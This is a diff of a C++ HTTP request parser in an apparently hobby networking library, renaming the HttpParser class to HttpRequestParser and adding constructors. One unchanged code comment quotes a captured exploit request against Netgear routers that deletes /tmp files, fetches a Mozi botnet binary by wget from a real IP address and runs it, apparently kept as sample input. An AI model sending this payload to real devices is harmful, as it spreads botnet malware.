@@ -12,19 +12,21 @@
 #define LOG_TAG "HttpPaser"
 
 namespace eular {
-
-HttpParser::HttpParser(const ByteBuffer& httpRequest) :
-    HttpParser(String8((const char *)httpRequest.const_data()))
+HttpRequestParser::HttpRequestParser()
 {
-
+    
+}
+HttpRequestParser::HttpRequestParser(const ByteBuffer& httpRequest)
+{
+    ParserRequest((const char *)httpRequest.const_data());
 }
 
-HttpParser::HttpParser(const String8& httpRequest)
+HttpRequestParser::HttpRequestParser(const String8& httpRequest)
 {
    ParserRequest(httpRequest);
 }
 
-const HttpParser::HttpRquestMap &HttpParser::ParserRequest(const String8& httpRequest)
+const HttpRequestParser::HttpRquestMap &HttpRequestParser::ParserRequest(const String8& httpRequest)
 {
     int32_t index = httpRequest.find("\r\n");
     if (index < 0) {
@@ -84,7 +86,7 @@ const HttpParser::HttpRquestMap &HttpParser::ParserRequest(const String8& httpRe
 
 // next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;
 // wget+http://61.54.223.119:48782/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
-bool HttpParser::ParserRequestData()
+bool HttpRequestParser::ParserRequestData()
 {
     if (mRequestData.size() == 0) {
         return true;
@@ -114,7 +116,7 @@ bool HttpParser::ParserRequestData()
     return true;
 }
 
-const String8 &HttpParser::getValueByKey(const String8 &key) const
+const String8 &HttpRequestParser::getValueByKey(const String8 &key) const
 {
     static String8 ret = "";
     auto it = mRequestDataMap.find(key);
@@ -125,7 +127,7 @@ const String8 &HttpParser::getValueByKey(const String8 &key) const
     return it->second;
 }
 
-bool HttpParser::KeepAlive() const
+bool HttpRequestParser::KeepAlive() const
 {
     auto it = mHttpRequestMap.find("Connection");
     if (it == mHttpRequestMap.end()) {
